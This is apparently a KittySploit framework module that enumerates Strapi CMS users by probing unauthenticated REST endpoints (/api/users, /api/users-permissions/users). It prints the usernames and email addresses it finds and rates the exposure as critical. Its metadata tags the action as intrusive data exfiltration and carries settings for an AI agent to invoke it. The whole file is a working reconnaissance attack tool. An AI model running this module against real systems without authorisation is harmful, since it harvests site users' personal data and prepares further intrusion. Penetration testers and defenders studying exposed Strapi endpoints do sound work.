#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Enumerate Strapi users and content via public REST API."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.scanner.http.strapi_probe import enumerate_strapi


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Strapi Users Enumeration",
        "description": (
            "Probes Strapi REST endpoints (/api/users, /api/users-permissions/users) "
            "for unauthenticated user listings with emails and usernames."
        ),
        "author": ["KittySploit Team"],
        "tags": ["strapi", "cms", "enumeration", "users", "auxiliary"],
        "modules": ["scanner/http/strapi_documentation_detect"],
        "agent": {
            "risk": "intrusive",
            "effects": ["network_probe", "data_exfiltration"],
            "expected_requests": 8,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.0,
            "noise": 0.4,
            "value": 1.2,
        },
    }

    def run(self):
        findings = enumerate_strapi(self.http_request)
        user_hits = [f for f in findings if f.get("kind") == "strapi_users_exposed"]
        if not user_hits and not findings:
            print_error("No Strapi user/content endpoints accessible")
            return False

        for hit in user_hits:
            users = hit.get("sample_users") or []
            print_success(f"Strapi {hit.get('path')}: {len(users)} user(s) sampled")
            for u in users:
                print_info(f"  → {u.get('username')} / {u.get('email')}")

        self.set_info(
            severity="critical" if user_hits else "medium",
            reason=f"Strapi enum: {len(findings)} accessible endpoint(s)",
            findings=findings,
        )
        return True
